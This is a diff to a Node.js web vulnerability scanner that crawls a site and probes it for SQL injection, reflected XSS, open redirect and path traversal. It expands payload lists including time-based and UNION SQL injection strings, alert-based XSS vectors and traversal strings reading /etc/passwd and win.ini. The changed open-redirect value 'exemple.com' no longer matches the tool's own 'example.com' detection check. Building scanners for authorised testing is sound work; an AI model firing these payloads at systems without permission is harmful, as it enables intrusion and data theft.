@@ -4,7 +4,7 @@
 // Maps an app (same-origin), discovers links/forms and tests:
 // - SQLi: error-based, boolean-based, time-based, union-based (heuristics)
 // - Reflected XSS (multi-context payloads + basic CSP awareness)
-// - Open Redirect (common & encoded variants, redirect-chain aware)       
+// - Open Redirect (common & encoded variants, redirect-chain aware)
 // - LFI / Path Traversal (Unix/Windows + common bypasses)
 // - DOM XSS indicators (static heuristic, non-executing)
 // made by m2hcs
@@ -42,8 +42,7 @@ function parseArgs(argv) {
     else if (a === "--max-pages") cfg.maxPages = parseInt(argv[++i] || "200", 10);
     else if (a === "--max-depth") cfg.maxDepth = parseInt(argv[++i] || "3", 10);
     else if (a === "--concurrency") cfg.concurrency = parseInt(argv[++i] || "5", 10);
-    else if (a === "--scan-concurrency") cfg.scanConcurrency = parseInt(argv[++i] || "5", 10); 
-    else if (a === "--timeout") cfg.timeout = parseInt(argv[++i] || "15000", 10);
+    else if (a === "--scan-concurrency") cfg.scanConcurrency = parseInt(argv[++i] || "5", 10);    else if (a === "--timeout") cfg.timeout = parseInt(argv[++i] || "15000", 10);
     else if (a === "--sleep") cfg.sleepSeconds = parseInt(argv[++i] || "4", 10);
     else if (a === "--header") {
       const line = argv[++i] || "";
@@ -60,7 +59,7 @@ function parseArgs(argv) {
       cfg.maxBodyKB = Math.max(64, parseInt(argv[++i] || "512", 10));
     } else if (a === "--param-ignore") {
       const p = argv[++i] || "";
-      try { cfg.paramIgnoreRe = p ? new RegExp(p, "i") : cfg.paramIgnoreRe; } catch {}
+      try { cfg.paramIgnoreRe = p ? new RegExp(p, "i") : cfg.paramIgnoreRe; } catch {}        
     }
   }
   if (!cfg.url) {
@@ -115,8 +114,8 @@ function lengthDiffScore(a, b) {
   return Math.abs(aa.length - bb.length) / ((aa.length + bb.length)/2);
 }
 function jaccardSim(a, b) {
-  const ta = new Set(String(a||"").toLowerCase().split(/[^a-z0-9_]+/g).filter(Boolean));       
-  const tb = new Set(String(b||"").toLowerCase().split(/[^a-z0-9_]+/g).filter(Boolean));       
+  const ta = new Set(String(a||"").toLowerCase().split(/[^a-z0-9_]+/g).filter(Boolean));      
+  const tb = new Set(String(b||"").toLowerCase().split(/[^a-z0-9_]+/g).filter(Boolean));      
   if (!ta.size && !tb.size) return 1;
   let inter = 0;
   for (const t of ta) if (tb.has(t)) inter++;
@@ -166,7 +165,7 @@ const SQL_ERRORS = [
   /sql syntax.*near/i
 ];
 
-const REDIRECT_PARAM_NAMES = /^(next|url|redirect|return|continue|dest|destination|r|u)$/i;    
+const REDIRECT_PARAM_NAMES = /^(next|url|redirect|return|continue|dest|destination|r|u)$/i;   
 const LFI_PARAM_NAMES = /^(file|path|page|template|include|doc|view|tpl|action)$/i;
 
 // ---------- HTTP ----------
@@ -201,7 +200,7 @@ function extractLinks(html, baseUrl) {
   let m;
   while ((m = re.exec(html))) {
     const href = m[1] || m[2] || m[3] || "";
-    if (!href || href.startsWith("javascript:") || href.startsWith("mailto:")) continue;       
+    if (!href || href.startsWith("javascript:") || href.startsWith("mailto:")) continue;      
     try { links.push(absUrl(baseUrl, href)); } catch {}
   }
   return links;
@@ -281,53 +280,103 @@ function extractQueryParams(u) {
 
 // ---------- Payloads ----------
 function sqliErrorPayloads(val) {
-  return [
-    String(val) + "'",
-    String(val) + "\"",
-    String(val) + "'-- ",
-    String(val) + "\"-- ",
-    String(val) + "')",
-    String(val) + '")',
-    String(val) + "' OR '1'='1",
-    String(val) + "\" OR \"1\"=\"1"
+  const v = String(val ?? "");
+  const candidates = [
+    v + "'",
+    v + "\"",
+    v + "\\",
+    v + "')",
+    v + "\")",
+    v + "'))",
+    v + "\"))",
+    v + "'-- -",
+    v + "\"-- -",
+    v + "'#",
+    v + "\"#",
+    v + "'/*",
+    v + "\"/*",
+    v + "' OR '1'='1",
+    v + "\" OR \"1\"=\"1",
+    v + "' OR '1'='1'-- -",
+    v + "\" OR \"1\"=\"1\"-- -",
+    v + "') OR ('1'='1",
+    v + "\") OR (\"1\"=\"1"
   ];
+  return Array.from(new Set(candidates));
 }
 function sqliBoolPayloads(val, isNum) {
-  if (isNum) return { t: String(val) + " AND 1=1", f: String(val) + " AND 1=2" };
-  return { t: String(val) + "' AND '1'='1'-- ", f: String(val) + "' AND '1'='2'-- " };
+  if (isNum) {
+    return {
+      t: String(val) + " AND (1=1)-- -",
+      f: String(val) + " AND (1=2)-- -"
+    };
+  }
+  return {
+    t: String(val) + "' AND '1'='1'-- -",
+    f: String(val) + "' AND '1'='2'-- -"
+  };
 }
 function sqliTimePayloads(val, secs) {
   const s = clamp(secs|0, 2, 10);
-  return isNumeric(val)
-    ? [ String(val) + ` AND SLEEP(${s})`, String(val) + ` AND pg_sleep(${s})`, String(val) + `;WAITFOR DELAY '0:0:${s}'--` ]
-    : [ String(val) + `' AND SLEEP(${s})-- `, String(val) + `'||pg_sleep(${s})--`, String(val) 
-+ `';WAITFOR DELAY '0:0:${s}'--` ];
+  const v = String(val ?? "");
+  const numeric = isNumeric(val);
+  const num = [
+    `${v} AND SLEEP(${s})-- -`,
+    `${v} AND pg_sleep(${s})-- -`,
+    `${v};WAITFOR DELAY '0:0:${s}'--`,
+    `${v} AND BENCHMARK(200000,MD5(1))-- -`
+  ];
+  const str = [
+    `${v}' AND SLEEP(${s})-- -`,
+    `${v}'||(SELECT pg_sleep(${s}))-- -`,
+    `${v}';WAITFOR DELAY '0:0:${s}'--`,
+    `${v}' AND 1=1 AND BENCHMARK(200000,MD5(1))-- -`,
+    `${v}' AND dbms_pipe.receive_message('a',${s})-- -`
+  ];
+  return Array.from(new Set(numeric ? num : str));
 }
 function sqliUnionPayloads(val) {
-  if (isNumeric(val)) {
-    return [
-      `${val} UNION SELECT NULL-- `,
-      `${val} UNION SELECT NULL,NULL-- `,
-      `${val} ORDER BY 1-- `,
-      `${val} ORDER BY 2-- `
-    ];
-  }
-  return [
-    `${val}' UNION SELECT NULL-- `,
-    `${val}' UNION SELECT NULL,NULL-- `,
-    `${val}' ORDER BY 1-- `,
-    `${val}' ORDER BY 2-- `
-  ];
+  const num = isNumeric(val);
+  const v = String(val ?? "");
+  const ord = [1,2,3,4,5,6].map(n => (num ? `${v} ORDER BY ${n}-- -` : `${v}' ORDER BY ${n}-- 
+-`));
+  const nulls = [1,2,3,4,5,6].map(n => {
+    const cols = Array(n).fill("NULL").join(",");
+    return num ? `${v} UNION SELECT ${cols}-- -` : `${v}' UNION SELECT ${cols}-- -`;
+  });
+  const versionMy = num ? `${v} UNION SELECT @@version-- -` : `${v}' UNION SELECT @@version-- 
+-`;
+  const versionPg = num ? `${v} UNION SELECT version()-- -` : `${v}' UNION SELECT version()-- 
+-`;
+  const commentAlts = num ? [`${v} UNION SELECT NULL#`, `${v} UNION SELECT NULL/*`]
+                          : [`${v}' UNION SELECT NULL#`, `${v}' UNION SELECT NULL/*`];        
+  return Array.from(new Set([
+    ...ord.slice(0, 4),
+    ...nulls.slice(0, 4),
+    versionMy,
+    versionPg,
+    ...commentAlts
+  ]));
 }
 
 function xssPayloads(token) {
-  return [
-    `${token}"'><svg/onload=alert(${token.length})>`,
-    `${token}"><img src=x onerror=alert(${token.length})>`,
-    `'><img src=x onerror=alert(${token.length})>`,
-    `"><script>alert(${token.length})</script>${token}`,
-    `</script><svg/onload=alert(${token.length})><!-- ${token} -->`
+  const t = String(token || randToken());
+  const L = t.length;
+  const list = [
+    `${t}"'><svg/onload=alert(${L})>`,
+    `${t}"><img src=x onerror=alert(${L})>`,
+    `'><img src=x onerror=alert(${L})>${t}`,
+    `"><script>alert(${L})</script>${t}`,
+    `</script><svg/onload=alert(${L})><!-- ${t} -->`,
+    `${t}" autofocus onfocus=alert(${L}) x="`,
+    `${t}' autofocus onfocus=alert(${L}) x='`,
+    `${t}"><body onload=alert(${L})>`,
+    `${t}"></textarea><svg/onload=alert(${L})>`,
+    `${t}";alert(${L});//`,
+    `${t}';alert(${L});//`,
+    `${t}javascript:alert(${L})`
   ];
+  return Array.from(new Set(list));
 }
 
 // ---------- Request builders ----------
@@ -342,7 +391,7 @@ function buildRequest(base, ep, mutateParam, newValue) {
   if (ep.enc === "query") {
     const u = new URL(ep.url);
     for (const p of ep.params) {
-      u.searchParams.set(p.name, String(p.name === mutateParam ? newValue : p.value));
+      u.searchParams.set(p.name, String(p.name === mutateParam ? newValue : p.value));        
     }
     return { url: u.href, method, headers, body: null, contentType: null };
   }
@@ -363,7 +412,7 @@ async function baselineRequest(base, ep) {
     "User-Agent": "auto-mapper-scanner/0.2",
     "Accept": "*/*"
   }, base.headers || {});
-  if (ep.enc === "form") headers["Content-Type"] = "application/x-www-form-urlencoded";        
+  if (ep.enc === "form") headers["Content-Type"] = "application/x-www-form-urlencoded";       
 
   let url = ep.url, body = null;
   if (ep.enc === "query") {
@@ -375,10 +424,8 @@ async function baselineRequest(base, ep) {
     for (const p of ep.params) sp.set(p.name, String(p.value));
     body = sp.toString();
   }
-  const r1 = await httpRequest(url, { method: ep.method, headers, body, timeout: base.timeout, 
-maxBodyKB: base.maxBodyKB });
-  const r2 = await httpRequest(url, { method: ep.method, headers, body, timeout: base.timeout, 
-maxBodyKB: base.maxBodyKB });
+  const r1 = await httpRequest(url, { method: ep.method, headers, body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
+  const r2 = await httpRequest(url, { method: ep.method, headers, body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
   return {
     status: r2.status || r1.status,
     timeMs: Math.round(((r1.timeMs||0) + (r2.timeMs||0)) / 2),
@@ -397,7 +444,8 @@ async function testSQLi(base, ep, param, baseline, findings, log) {
     const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
     if (!r.ok) continue;
     if (SQL_ERRORS.some(rx => rx.test(r.text || ""))) {
-      findings.push({ type:"SQLi (error-based)", endpoint: ep.url, method: ep.method, param });      log.debug(`[SQLi:Error] ${ep.method} ${ep.url} [${param}]`);
+      findings.push({ type:"SQLi (error-based)", endpoint: ep.url, method: ep.method, param });
+      log.debug(`[SQLi:Error] ${ep.method} ${ep.url} [${param}]`);
       break;
     }
   }
@@ -407,18 +455,14 @@ async function testSQLi(base, ep, param, baseline, findings, log) {
   const reqT = buildRequest(base, ep, param, bp.t);
   const reqF = buildRequest(base, ep, param, bp.f);
   const [rt, rf] = await Promise.all([
-    httpRequest(reqT.url, { method:reqT.method, headers:reqT.headers, body:reqT.body, timeout: 
-base.timeout, maxBodyKB: base.maxBodyKB }),
-    httpRequest(reqF.url, { method:reqF.method, headers:reqF.headers, body:reqF.body, timeout: 
-base.timeout, maxBodyKB: base.maxBodyKB })
+    httpRequest(reqT.url, { method:reqT.method, headers:reqT.headers, body:reqT.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB }),
+    httpRequest(reqF.url, { method:reqF.method, headers:reqF.headers, body:reqF.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB })
   ]);
   if (rt.ok && rf.ok) {
     const dT = compositeDelta(baseline.text, rt.text);
     const dF = compositeDelta(baseline.text, rf.text);
-    // Heuristic: false-branch diverges, true-branch stays similar OR statuses differ
     if ((dF.delta - dT.delta) >= 0.20 || rt.status !== rf.status) {
-      findings.push({ type:"SQLi (boolean-based)", endpoint: ep.url, method: ep.method, param, 
-note:`ΔF=${dF.delta.toFixed(2)} vs ΔT=${dT.delta.toFixed(2)}` });
+      findings.push({ type:"SQLi (boolean-based)", endpoint: ep.url, method: ep.method, param, note:`ΔF=${dF.delta.toFixed(2)} vs ΔT=${dT.delta.toFixed(2)}` });
       log.debug(`[SQLi:Bool] ${ep.method} ${ep.url} [${param}] ΔF=${dF.delta.toFixed(2)} ΔT=${dT.delta.toFixed(2)}`);
     }
   }
@@ -455,9 +499,8 @@ function appearsReflectedUnsafely(txt, token) {
   if (!txt.includes(token)) return false;
   const enc1 = encodeURIComponent(token);
   if (txt.includes(enc1)) return false;
-  // Look for typical executable contexts near the token
-  if (/(<svg\b|<img\b|<script\b|onerror=|onload=|<\/script>)/i.test(txt)) return true;
-  return true; // fallback: raw reflection without encoding
+  if (/(<svg\b|<img\b|<script\b|onerror=|onload=|<\/script>)/i.test(txt)) return true;        
+  return true;
 }
 
 async function testXSS(base, ep, param, findings, baseline, log) {
@@ -469,9 +512,8 @@ async function testXSS(base, ep, param, findings, baseline, log) {
     const txt = r.text || "";
     if (appearsReflectedUnsafely(txt, token)) {
       const csp = (r.headers["content-security-policy"] || "").toLowerCase();
-      const note = csp ? `CSP present (${csp.slice(0,80)}...)` : "No CSP header observed";     
-      findings.push({ type:"XSS (reflected)", endpoint: ep.url, method: ep.method, param, note 
-});
+      const note = csp ? `CSP present (${csp.slice(0,80)}...)` : "No CSP header observed";    
+      findings.push({ type:"XSS (reflected)", endpoint: ep.url, method: ep.method, param, note });
       log.debug(`[XSS:Reflected] ${ep.method} ${ep.url} [${param}] ${note}`);
       break;
     }
@@ -481,7 +523,7 @@ async function testXSS(base, ep, param, findings, baseline, log) {
 async function testOpenRedirect(base, ep, param, findings, log) {
   if (!REDIRECT_PARAM_NAMES.test(param)) return;
   const values = [
-    "https://example.com/evil", # put here yours to test
+    "https://exemple.com" // put your here
   ];
   for (const evil of values) {
     const req = buildRequest(base, ep, param, evil);
@@ -490,8 +532,9 @@ async function testOpenRedirect(base, ep, param, findings, log) {
     const final = (r.url || "");
     const hit = (r.status >= 300 && r.status < 400 && /example\.com/i.test(loc)) || /example\.com/i.test(final);
     if (hit) {
-      findings.push({ type:"Open Redirect", endpoint: ep.url, method: ep.method, param, note: `to=${loc || final}` });
-      log.debug(`[OpenRedirect] ${ep.method} ${ep.url} [${param}] -> ${loc || final}`);        
+      findings.push({ type:"Open Redirect", endpoint: ep.url, method: ep.method, param, note: 
+`to=${loc || final}` });
+      log.debug(`[OpenRedirect] ${ep.method} ${ep.url} [${param}] -> ${loc || final}`);       
       break;
     } else if ((r.text||"").includes("example.com")) {
       findings.push({ type:"Open Redirect (indirect)", endpoint: ep.url, method: ep.method, param });
@@ -505,24 +548,32 @@ async function testLFI(base, ep, param, findings, log) {
   if (!LFI_PARAM_NAMES.test(param)) return;
   const payloads = [
     "../../../../../../etc/passwd",
+    "....//....//....//....//etc/passwd",
     "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
-    "php://filter/convert.base64-encode/resource=/etc/passwd",
-    "..\\..\\..\\..\\windows\\win.ini",
-    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+    "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "/etc/passwd",
+    "file:///etc/passwd",
     "/etc/passwd%00",
-    "C:\\Windows\\win.ini"
+    "..\\..\\..\\..\\Windows\\win.ini",
+    "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
+    "C:\\Windows\\win.ini",
+    "C:%5cWindows%5cwin.ini",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/resource=/etc/passwd",
+    "php://filter/string.strip_tags/resource=/etc/passwd"
   ];
   for (const p of payloads) {
     const req = buildRequest(base, ep, param, p);
     const r = await httpRequest(req.url, { method:req.method, headers:req.headers, body:req.body, timeout: base.timeout, maxBodyKB: base.maxBodyKB });
     const txt = r.text || "";
     if (/root:x:0:0:|\/bin\/bash/.test(txt) || /\[fonts\]/i.test(txt) || /cm9vdDoweDow/i.test(txt)) {
-      findings.push({ type:"LFI / Path Traversal", endpoint: ep.url, method: ep.method, param, 
-note:p });
+      findings.push({ type:"LFI / Path Traversal", endpoint: ep.url, method: ep.method, param, note:p });
       log.debug(`[LFI] ${ep.method} ${ep.url} [${param}] (${p})`);
       break;
     }
-    if (/failed to open stream|No such file or directory|include\(|require\(/i.test(txt)) {    
+    if (/failed to open stream|No such file or directory|include\(|require\(/i.test(txt)) {   
       findings.push({ type:"File include error leak (indicator)", endpoint: ep.url, method: ep.method, param, note: p });
       log.debug(`[LFI:Indicator] ${ep.method} ${ep.url} [${param}] (${p})`);
       break;
@@ -560,15 +611,15 @@ async function crawl(cfg, log) {
 
     // Heuristic DOM XSS indicator
     if (detectDomXssIndicators(html)) {
-      pageFindings.push({ type:"DOM XSS indicator", endpoint: r.url, method:"GET", param:"-", note:"Source+Sink in DOM" });
+      pageFindings.push({ type:"DOM XSS indicator", endpoint: r.url, method:"GET", param:"-", 
+note:"Source+Sink in DOM" });
     }
 
     // Links
     for (const href of extractLinks(html, r.url)) {
       if (!sameOrigin(origin, href)) continue;
       const np = normPath(href);
-      if (!visitedPaths.has(np) && toVisit.length + pages.length < cfg.maxPages && one.depth + 
-1 <= cfg.maxDepth) {
+      if (!visitedPaths.has(np) && toVisit.length + pages.length < cfg.maxPages && one.depth + 1 <= cfg.maxDepth) {
         visitedPaths.add(np);
         toVisit.push({ url: stripHash(href), depth: one.depth + 1 });
       }
@@ -589,8 +640,7 @@ async function crawl(cfg, log) {
         for (const p of f.fields) u.searchParams.set(p.name, p.value || "test");
         endpoints.push({ method:"GET", url: stripHash(u.href), enc:"query", params: f.fields });
       } else {
-        endpoints.push({ method:"POST", url: stripHash(f.action), enc:"form", params: f.fields 
-});
+        endpoints.push({ method:"POST", url: stripHash(f.action), enc:"form", params: f.fields });
       }
     }
   }
@@ -663,7 +713,7 @@ async function main() {
     endpointsToScan = endpoints.slice(0, maxAnalyze);
   }
 
-  log.info(`Starting vulnerability tests (scanConcurrency=${cfg.scanConcurrency})...`);        
+  log.info(`Starting vulnerability tests (scanConcurrency=${cfg.scanConcurrency})...`);       
   const findings = await scanAll(cfg, endpointsToScan, log);
   if (pageFindings.length) findings.unshift(...pageFindings);
 
@@ -687,7 +737,7 @@ async function main() {
   for (const [type, arr] of Object.entries(groups)) {
     console.log(`- ${type}: ${arr.length}`);
     for (const f of arr.slice(0, 20)) {
-      console.log(`  ${f.method} ${f.endpoint} [${f.param}]${f.note?` (${f.note})`:""}`);      
+      console.log(`  ${f.method} ${f.endpoint} [${f.param}]${f.note?` (${f.note})`:""}`);     
     }
     if (arr.length > 20) console.log(`  ... +${arr.length-20} more`);
   }
